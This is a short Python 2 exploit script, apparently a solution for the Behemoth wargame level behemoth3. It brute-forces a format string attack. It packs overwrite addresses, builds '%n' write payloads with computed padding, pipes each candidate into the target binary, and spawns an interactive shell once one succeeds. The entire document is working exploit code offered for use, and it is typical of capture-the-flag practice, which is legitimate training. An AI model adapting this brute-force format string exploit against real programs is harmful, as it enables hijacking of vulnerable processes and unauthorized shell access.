import sys
import os
import struct
import string


a = int(sys.argv[1], 16)
b = int(sys.argv[2], 16)
i = int(sys.argv[3]) # if int(sys.argv[3]) else 256
# a = 0xffffd5c0
# b = 0xffffddb1 + 4


def spawn(payload):
	os.system("( python -c 'print \"" + payload + "\"'; cat ) | /behemoth/behemoth3 ")
	quit()


def execute(payload, n = 0, s = ""):
	command = "python -c 'print \"" + payload + "\"'"
	command += " | /behemoth/behemoth3 > /dev/null"
	print s + "  "*n + command
	# return 1
	return os.system(command)

def format(s):
	return '\\x' + '\\x'.join(x.encode('hex') for x in struct.pack("<I", s))


def pad(x):
	l = x & ((1 << 16) - 1)
	l -= 8
	h = x >> 16
	h -= (l + 8)

	padding = "%" + `l` + "d%7$n"
	padding += "%" + `h` + "d%6$n"
	return padding

for x in range(a, a + i, 4):
	address = format(x + 2)
	address += format(x)

	n = 0
	for y in range(b, b + 64, 1):
		payload = address + pad(y)
		if execute(payload, n, hex(x) + " " + hex(y) + ": ") == 0:
			if n == 1:
				print "BINGO!!"
				spawn(payload)
			break
		n = 1
